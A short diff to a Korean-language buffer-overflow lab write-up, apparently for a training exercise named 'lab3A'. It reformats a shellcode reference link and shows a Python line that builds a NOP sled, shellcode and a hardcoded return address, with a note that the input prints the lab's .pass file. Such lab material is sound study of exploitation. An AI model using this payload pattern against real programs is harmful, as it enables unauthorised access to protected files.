@@ -165,9 +165,8 @@
 
 	print("\x90"*(128-len(shellcode)) + shellcode + "\x90"*28 + "\x40\xf6\xff\xbf")
 ```
-```
-	* 쉘코드 참조 : http://shell-storm.org/shellcode/files/shellcode-73.html
-```
+> 쉘코드 참조 : http://shell-storm.org/shellcode/files/shellcode-73.html
+
 - 생성된 입력 데이터로 프로그램을 실행하면 "/home/lab3A/.pass" 파일 내용이 출력됨
   (※ GDB 환경에서의 리턴주소와 실제 프로그램 실행 시 리턴주소는 약간의 차이가 있음)
 ```
